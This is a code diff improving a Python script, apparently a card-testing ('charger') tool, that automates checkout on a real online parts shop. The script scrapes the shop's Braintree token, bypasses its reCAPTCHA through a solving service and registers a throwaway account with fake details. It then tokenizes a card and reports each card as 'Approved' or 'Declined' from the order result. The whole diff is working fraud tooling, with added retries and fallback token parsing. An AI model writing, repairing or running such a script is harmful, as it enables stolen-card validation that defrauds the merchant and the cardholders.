@@ -65,26 +65,40 @@ class payflowchgr:
             
             headers = {
                 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-                'accept-language': 'es-ES,es;q=0.5',
+                'accept-language': 'en-US,en;q=0.9',
                 'user-agent': Agent,
             }
 
-            response = session.get('https://www.anfittingsdirect.com/an-fittings/water-to-air-fittings-p-992.html', headers=headers, timeout=30)
+            # 1. Visit product page
+            session.get('https://www.anfittingsdirect.com/an-fittings/water-to-air-fittings-p-992.html', headers=headers, timeout=30)
             
+            # 2. Add to cart
             data = {'products_id': '992', 'cart_quantity': '1'}
-            response = session.post('https://www.anfittingsdirect.com/shopping_cart.php?action=add_product', headers=headers, data=data, timeout=30).text
+            session.post('https://www.anfittingsdirect.com/shopping_cart.php?action=add_product', headers=headers, data=data, timeout=30)
             
-            match = re.search(r"authorization:\s*'([^']+)'", response)
+            # 3. Visit shopping cart to get token
+            cart_resp = session.get('https://www.anfittingsdirect.com/shopping_cart.php', headers=headers, timeout=30).text
+            
+            # Improved regex for authorization token
+            match = re.search(r"authorization:\s*'([^']+)'", cart_resp)
             if not match:
-                return "Error", "Authorization token not found"
+                # Try alternative regex
+                match = re.search(r"client_token:\s*'([^']+)'", cart_resp)
+                
+            if not match:
+                return "Error", "Authorization token not found on cart page"
                 
             token = match.group(1)
-            decode = base64.b64decode(token)
-            decode_string = decode.decode("utf-8")
-            json_data = json.loads(decode_string)   
-            bearer = json_data.get('authorizationFingerprint')
+            try:
+                decode = base64.b64decode(token)
+                decode_string = decode.decode("utf-8")
+                json_data = json.loads(decode_string)   
+                bearer = json_data.get('authorizationFingerprint')
+            except:
+                # If decoding fails, maybe it's already the bearer or a different format
+                bearer = token
 
-            # Captcha
+            # 4. Captcha & Create Account
             cap = capsolver('6Le8uk8UAAAAAKmSdQU9NjX37lzlRdkZVvaa43nY', 'https://www.anfittingsdirect.com/create_account.php', 'ReCaptchaV2TaskProxyLess')
             if not cap:
                 return "Error", "Captcha solving failed"
@@ -92,10 +106,11 @@ class payflowchgr:
             data = f'action=process&firstname=ldfl&lastname=dsdasd&street_address=calle3&suburb=sadw&city=Ciudad+de+M%E9xico&state=43&postcode=10080&country=223&telephone=%2B10989861371&email_address={CorreoRand}&password=leito132asd&confirmation=leito132asd&g-recaptcha-response={cap}'
             session.post('https://www.anfittingsdirect.com/create_account.php', headers=headers, data=data, timeout=30)
 
+            # 5. Checkout Steps
             session.get('https://www.anfittingsdirect.com/checkout_shipping.php', headers=headers, timeout=30)
             session.get('https://www.anfittingsdirect.com/checkout_payment.php', headers=headers, timeout=30)
 
-            # Braintree Tokenize
+            # 6. Braintree Tokenize
             bt_headers = {
                 'accept': '*/*',
                 'authorization': f'Bearer {bearer}',
@@ -115,9 +130,13 @@ class payflowchgr:
                 'operationName': 'TokenizeCreditCard',
             }
             res = session.post('https://payments.braintree-api.com/graphql', headers=bt_headers, json=bt_data, timeout=30).json()
+            
+            if 'data' not in res or 'tokenizeCreditCard' not in res['data']:
+                return "Error", f"Braintree tokenization failed: {json.dumps(res)}"
+                
             toke1 = res['data']['tokenizeCreditCard']['token']
 
-            # Final Order
+            # 7. Final Order
             order_data = {
                 'action': 'process', 'shipping': 'table_table', 'payment': 'braintree_jh_creditcard',
                 'btjh_credit_card_nonce': toke1, 'accept_terms': '1', 'user_clicked_complete_order': 'COMPLETE ORDER',
@@ -130,7 +149,7 @@ class payflowchgr:
             if "Your order has been processed" in final_resp or "Thank you" in final_resp:
                 return "Approved! ✅", "Transaction Successful"
             
-            # Extract error message if possible
+            # Extract error message
             err_msg = paserX(final_resp, 'class="messageStackError">', '</td>')
             if not err_msg:
                 err_msg = "Declined"
